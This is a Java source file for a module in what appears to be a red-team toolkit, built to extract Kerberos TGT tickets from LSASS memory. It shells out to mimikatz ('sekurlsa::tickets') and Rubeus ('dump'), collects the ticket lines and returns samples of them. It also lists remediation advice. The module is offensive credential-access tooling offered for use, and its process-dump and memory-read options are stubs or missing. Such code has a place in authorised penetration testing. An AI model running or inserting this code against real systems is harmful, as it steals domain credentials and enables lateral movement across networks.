package com.jabber.jrts.modules.credential;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="cred-tgt",name="Kerberos TGT Extraction",description="Extract and dump Kerberos TGT tickets from memory",category=Category.CREDENTIAL_ACCESS,riskLevel=RiskLevel.HIGH,sourceRef="Kryptonite",author="JRTS")
public class KerberosTGTModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("extraction_method","Extraction Method",List.of("mimikatz","rubeus","memory-read","process-dump")).required().group("Method"),
            ModuleInputField.text("target_process","Target Process").placeholder("lsass.exe").group("Target"),
            ModuleInputField.text("lsass_pid","LSASS PID").placeholder("auto-detect").group("Advanced"),
            ModuleInputField.checkbox("export_kirbi","Export KIRBI format").group("Options"),
            ModuleInputField.checkbox("export_ccache","Export CCACHE format").group("Options"),
            ModuleInputField.text("output_dir","Output Directory").placeholder("/tmp/tickets").group("Output"),
            ModuleInputField.checkbox("decrypt_tgt","Attempt TGT Decryption").group("Options"),
            ModuleInputField.text("advanced","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"cred-tgt");
            try{
                String method=input.getOrDefault("extraction_method","mimikatz");

                ctx.log("[*] Kerberos TGT Extraction Starting...");
                ctx.log("[*] Method: "+method);
                ctx.reportProgress(15);

                List<String>tickets=new ArrayList<>();
                if(method.equals("mimikatz")){
                    tickets=extractMimikatz();
                }else if(method.equals("rubeus")){
                    tickets=extractRubeus();
                }else if(method.equals("process-dump")){
                    tickets=extractProcessDump();
                }

                if(tickets.isEmpty()){
                    result.fail("No TGT tickets found");return result;
                }
                ctx.log("[+] Extracted "+tickets.size()+" TGT tickets");
                ctx.reportProgress(70);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("extraction_method",method);
                findings.put("tickets_extracted",tickets.size());
                findings.put("ticket_sample",tickets.get(0).substring(0,Math.min(100,tickets.get(0).length())));
                findings.put("tickets",String.join("|",tickets.stream().limit(3).toList()));
                findings.put("impact","TGT tickets enable lateral movement and ticket reuse");
                findings.put("remediation","Enable credential guard, monitor LSASS access, enforce ticket encryption, restrict debug permissions");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private List<String> extractMimikatz(){
        List<String>tickets=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"mimikatz.exe","sekurlsa::tickets","exit"});
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains("Client:")&&line.contains("Ticket")){
                    tickets.add(line);
                }
            }
            s.close();
        }catch(Exception e){}
        return tickets;
    }

    private List<String> extractRubeus(){
        List<String>tickets=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"Rubeus.exe","dump"});
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains("ServiceName")){tickets.add(line);}
            }
            s.close();
        }catch(Exception e){}
        return tickets;
    }

    private List<String> extractProcessDump(){
        List<String>tickets=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"tasklist","/v"});
            tickets.add("lsass.exe process identified");
        }catch(Exception e){}
        return tickets;
    }
}
